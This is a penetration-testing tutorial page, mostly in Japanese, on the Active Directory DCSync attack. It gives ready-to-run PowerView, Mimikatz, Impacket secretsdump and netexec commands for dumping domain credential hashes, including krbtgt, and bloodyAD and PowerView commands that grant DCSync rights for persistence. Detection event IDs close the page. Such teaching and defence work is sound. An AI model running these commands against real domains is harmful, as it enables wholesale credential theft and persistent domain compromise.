# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** permission は、ドメイン自体に対する以下の権限を意味します: **DS-Replication-Get-Changes**、**Replicating Directory Changes All**、および **Replicating Directory Changes In Filtered Set**。<sup>[[3]](#references)</sup>

**DCSync に関する重要な注意事項:**

- **DCSync attack は Domain Controller の動作をシミュレートし、Directory Replication Service Remote Protocol (MS-DRSR) を使用して、他の Domain Controller に情報のレプリケーションを要求します**。MS-DRSR は Active Directory における正当かつ必要な機能であるため、停止または無効化することはできません。
- デフォルトでは、**Domain Admins、Enterprise Admins、Administrators、Domain Controllers** グループのみが必要な権限を持ちます。
- 実際には、**full DCSync** にはドメインの naming context に対する **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** が必要です。`DS-Replication-Get-Changes-In-Filtered-Set` は通常これらと併せて委任されますが、単独の場合は完全な krbtgt dump よりも、**confidential / RODC-filtered attributes**（例: 旧式の LAPS-style secrets）の同期に関係します。<sup>[[2]](#references)</sup>
- アカウントのパスワードが reversible encryption で保存されている場合、Mimikatz ではパスワードを clear text で返すオプションを利用できます。

### Enumeration

`powerview` を使用して、これらの権限を持つユーザーを確認します。
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
DCSync 権限を持つ**デフォルト以外のプリンシパル**に焦点を当てる場合は、組み込みのレプリケーション対応グループを除外し、想定外のトラスティのみを確認します。
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### ローカルでExploit
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### リモートでExploit
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
実践的なスコープを限定した例:<sup>[[1]](#references)</sup>
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### 捕捉した DC machine TGT (ccache) を使用した DCSync

unconstrained-delegation export-mode のシナリオでは、Domain Controller machine TGT（例: `krbtgt@DOMAIN` に対する `DC1$@DOMAIN`）を捕捉できる場合があります。その後、その ccache を使用して DC として認証し、パスワードなしで DCSync を実行できます。<sup>[[5]](#references)</sup>
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
運用上の注意:

- **Impacket's Kerberos path touches SMB first** before the DRSUAPI call. 環境で **SPN target name validation** が適用されている場合、`Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user` により、full dump に失敗することがあります。
- この場合は、まず対象 DC 用の **`cifs/<dc>`** service ticket を要求するか、必要なアカウントに対してすぐに **`-just-dc-user`** を使用します。
- replication 権限が限定されている場合でも、LDAP/DirSync-style syncing により、full krbtgt replication を行わずに **confidential** または **RODC-filtered** attributes（例: legacy `ms-Mcs-AdmPwd`）が露出することがあります。<sup>[[2]](#references)</sup>

`-just-dc` は3つのファイルを生成します:

- **NTLM hashes** を含むファイル
- **Kerberos keys** を含むファイル
- [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) が有効なアカウントについて、NTDS から取得した cleartext passwords を含むファイル。reversible encryption が有効なユーザーは、次のコマンドで取得できます。

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

domain admin である場合、PowerView を使って任意のユーザーにこれらの権限を付与できます:<sup>[[3]](#references)</sup>
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Linuxオペレーターは`bloodyAD`を使って同じことができます:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
その後、以下の出力で**ユーザーに3つの権限が正しく割り当てられているか確認**できます（「ObjectType」フィールド内に権限名が表示されるはずです）:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- Security Event ID 4662 (Audit Policy for object must be enabled) – オブジェクトに対して操作が実行された<sup>[[4]](#references)</sup>
- Security Event ID 5136 (Audit Policy for object must be enabled) – ディレクトリサービスオブジェクトが変更された
- Security Event ID 4670 (Audit Policy for object must be enabled) – オブジェクトの権限が変更された
- AD ACL Scanner - ACLのレポートを作成して比較します。 [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket ChangeLog](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Replication Get-ChangesおよびGet-Changes-In-Filtered-Setの活用](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Domain Controllerからパスワードハッシュをダンプする](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
